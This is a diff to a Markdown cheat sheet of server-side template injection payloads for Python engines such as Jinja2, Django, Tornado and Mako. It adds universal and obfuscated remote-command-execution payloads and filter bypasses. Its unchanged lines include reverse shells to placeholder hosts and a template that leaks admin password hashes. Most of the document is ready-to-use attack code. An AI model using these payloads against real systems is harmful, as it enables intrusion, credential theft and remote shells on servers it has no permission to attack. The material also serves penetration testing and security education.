@@ -2,10 +2,10 @@
 
 > Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious input into a server-side template, causing arbitrary code execution on the server. In Python, SSTI can occur when using templating engines such as Jinja2, Mako, or Django templates, where user input is included in templates without proper sanitization.
 
-
 ## Summary
 
 - [Templating Libraries](#templating-libraries)
+- [Universal Payloads](#universal-payloads)
 - [Django](#django)
     - [Django - Basic Injection](#django---basic-injection)
     - [Django - Cross-Site Scripting](#django---cross-site-scripting)
@@ -27,28 +27,41 @@
         - [Exploit The SSTI By Calling subprocess.Popen](#exploit-the-ssti-by-calling-subprocesspopen)
         - [Exploit The SSTI By Calling Popen Without Guessing The Offset](#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)
         - [Exploit The SSTI By Writing an Evil Config File](#exploit-the-ssti-by-writing-an-evil-config-file)
+    - [Jinja2 - Remote Command Execution with Obfuscation](#jinja2---remote-command-execution-with-obfuscation)
     - [Jinja2 - Filter Bypass](#jinja2---filter-bypass)
 - [Tornado](#tornado)
     - [Tornado - Basic Injection](#tornado---basic-injection)
-    - [Tornado - Remote Command Execution](#tornado---remote-command-execution)    
+    - [Tornado - Remote Command Execution](#tornado---remote-command-execution)
 - [Mako](#mako)
     - [Mako - Remote Command Execution](#mako---remote-command-execution)
+    - [Mako - Remote Command Execution with Obfuscation](#mako---remote-command-execution-with-obfuscation)
 - [References](#references)
-
 
 ## Templating Libraries
 
 | Template Name | Payload Format |
-| ------------ | --------- |
-| Bottle    | `{{ }}`  |
-| Chameleon | `${ }`   |
-| Cheetah   | `${ }`   |
-| Django    | `{{ }}`  |
-| Jinja2    | `{{ }}`  |
-| Mako      | `${ }`   |
-| Pystache  | `{{ }}`  |
-| Tornado   | `{{ }}`  |
+|---------------|----------------|
+| Bottle        | `{{ }}`        |
+| Chameleon     | `${ }`         |
+| Cheetah       | `${ }`         |
+| Django        | `{{ }}`        |
+| Jinja2        | `{{ }}`        |
+| Mako          | `${ }`         |
+| Pystache      | `{{ }}`        |
+| Tornado       | `{{ }}`        |
 
+## Universal Payloads
+
+Generic code injection payloads work for many Python-based template engines, such as Bottle, Chameleon, Cheetah, Mako and Tornado.
+
+To use these payloads, wrap them in the appropriate tag.
+
+```python
+__include__("os").popen("id").read() # Rendered RCE
+getattr("", "x" + __include__("os").popen("id").read()) # Error-Based RCE
+1 / (__include__("os").popen("id")._proc.wait() == 0) # Boolean-Based RCE
+__include__("os").popen("id && sleep 5").read() # Time-Based RCE
+```
 
 ## Django
 
@@ -61,7 +74,6 @@ Django template language supports 2 rendering engines by default: Django Templat
 {{ 7*7 }}  # Error with Django Templates
 ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
 ```
-
 
 ### Django - Cross-Site Scripting
 
@@ -84,17 +96,17 @@ ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
 
 ### Django - Admin Site URL leak
 
-
-```
+```python
 {% include 'admin/base.html' %}
 ```
 
 ### Django - Admin Username And Password Hash Leak
 
-
-```
+```ps1
 {% load log %}{% get_admin_log 10 as log %}{% for e in log %}
 {{e.user.get_username}} : {{e.user.password}}{% endfor %}
+
+{% get_admin_log 10 as admin_log for_user user %}
 ```
 
 ---
@@ -137,7 +149,7 @@ If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump
 <pre>{% debug %}</pre>
 ```
 
-Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement
+Source: [jinja.palletsprojects.com](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)
 
 ### Jinja2 - Dump All Used Classes
 
@@ -202,7 +214,6 @@ def hook(*args, **kwargs):
 }}
 ```
 
-
 #### Exploit The SSTI By Calling os.popen().read()
 
 ```python
@@ -217,7 +228,7 @@ But when `__builtins__` is filtered, the following payloads are context-free, an
 {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
-We can use these shorter payloads:
+We can use these shorter payloads from [@podalirius_](https://twitter.com/podalirius_): [python-vulnerabilities-code-execution-in-jinja-templates](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/):
 
 ```python
 {{ cycler.__init__.__globals__.os.popen('id').read() }}
@@ -225,15 +236,18 @@ We can use these shorter payloads:
 {{ namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
-Source [@podalirius_](https://twitter.com/podalirius_) : https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/
+Similar payloads could be used for Error-Based and Boolean-Based exploitation:
+
+```python
+{{ cycler.__init__.__globals__.__builtins__.getattr("", "x" + cycler.__init__.__globals__.os.popen('id').read()) }} # Error-Based
+{{ 1 / (cycler.__init__.__globals__.os.popen("id")._proc.wait() == 0) }} # Boolean-Based
+```
 
 With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. This is the shortest payload known to achieve RCE in a Jinja2 template:
 
 ```python
 {{ lipsum.__globals__["os"].popen('id').read() }}
 ```
-
-Source: https://twitter.com/podalirius_/status/1655970628648697860
 
 #### Exploit The SSTI By Calling subprocess.Popen
 
@@ -250,8 +264,7 @@ Source: https://twitter.com/podalirius_/status/1655970628648697860
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 ```
 
-Simply modification of payload to clean up output and facilitate command input (https://twitter.com/SecGus/status/1198976764351066113)
-In another GET parameter include a variable named "input" that contains the command you want to run (For example: &input=ls)
+Simple modification of the payload to clean up output and facilitate command input from [@SecGus](https://twitter.com/SecGus/status/1198976764351066113). In another GET parameter include a variable named "input" that contains the command you want to run (For example: &input=ls)
 
 ```python
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
@@ -269,6 +282,18 @@ In another GET parameter include a variable named "input" that contains the comm
 # connect to evil host
 {{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
 ```
+
+### Jinja2 - Remote Command Execution with Obfuscation
+
+Write the string: `id` using the index position of a known existing string (the index value may vary depending on the target): `{{self.__init__.__globals__.__str__()[1786:1788]}}`.
+
+Execute the system command `id`:
+
+```python
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}
+```
+
+Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
 
 ### Jinja2 - Filter Bypass
 
@@ -303,15 +328,17 @@ Bypassing `|join`
 http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
 ```
 
-Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus:
+Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by [@SecGus](https://twitter.com/SecGus):
+
 ```python
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 ```
 
 ---
 
-
 ## Tornado
+
+> Universal payloads also work for Tornado.
 
 ### Tornado - Basic Injection
 
@@ -329,14 +356,12 @@ Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by http
 
 ---
 
-
 ## Mako
+
+> Universal payloads also work for Mako.
 
 [Official website](https://www.makotemplates.org/)
 > Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.
-
-
-
 
 ```python
 <%
@@ -414,10 +439,28 @@ PoC :
 <module 'os' from '/usr/local/lib/python3.10/os.py'>
 ```
 
+### Mako - Remote Command Execution with Obfuscation
+
+In Mako, the following payload can be used to generates the string "id": `${str().join(chr(i)for(i)in[105,100])}`.
+
+Execute the system command `id`:
+
+```python
+${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
+```
+
+```python
+<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}
+```
+
+Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
 
 ## References
 
-- [Cheatsheet - Flask & Jinja2 SSTI - phosphore - September 3, 2018](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
+- [Cheatsheet - Flask & Jinja2 SSTI - phosphore - September 3, 2018](https://web.archive.org/web/20191029021639/http://pequalsnp-team.github.io:80/cheatsheet/flask-jinja2-ssti)
 - [Exploring SSTI in Flask/Jinja2, Part II - Tim Tomes - March 11, 2016](https://web.archive.org/web/20170710015954/https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
-- [Jinja2 template injection filter bypasses - Sebastian Neef - August 28, 2017](https://0day.work/jinja2-template-injection-filter-bypasses/)
-- [Python context free payloads in Mako templates - podalirius - August 26, 2021](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)
+- [Jinja2 template injection filter bypasses - Sebastian Neef - August 28, 2017](https://web.archive.org/web/20180901222505/https://0day.work/jinja2-template-injection-filter-bypasses/)
+- [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - Brumens - March 24, 2025](https://web.archive.org/web/20240906203847/https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
+- [Python context free payloads in Mako templates - podalirius - August 26, 2021](https://web.archive.org/web/20210826203322/https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)
+- [The minefield between syntaxes: exploiting syntax confusions in the wild - Brumens - October 17, 2025](https://web.archive.org/web/20251006113218/https://www.yeswehack.com/learn-bug-bounty/syntax-confusion-ambiguous-parsing-exploits)
+- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 3, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
